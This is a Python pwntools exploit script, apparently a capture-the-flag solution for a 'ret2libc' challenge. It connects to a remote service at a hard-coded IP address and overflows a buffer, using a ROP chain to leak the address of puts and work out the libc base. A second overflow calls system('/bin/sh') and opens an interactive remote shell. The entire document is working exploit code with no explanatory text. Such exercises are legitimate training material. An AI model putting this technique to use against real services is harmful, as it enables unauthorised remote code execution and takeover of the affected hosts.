from pwn import *

elf = ELF('./ret2libc')
libc = ELF('./libc-2.23.so')
p = remote('139.155.83.108',10003)

p.recvuntil('No system,How 2 /bin/sh?')

filling = b'a' * 0x200 + p64(elf.bss()+0x500)

payload = filling + p64(0x400763) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x400637)

p.send(payload)

p.recvuntil('\x40\x15\x60\x0a')

puts_addr = int.from_bytes(p.recv(6),byteorder='little')

print("puts_addr leaked: {}".format(hex(puts_addr)))

libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))

p.recvuntil('No system,How 2 /bin/sh?')

payload = filling + p64(0x400763) + p64(binsh_addr) + p64(system_addr)

p.send(payload)

p.interactive()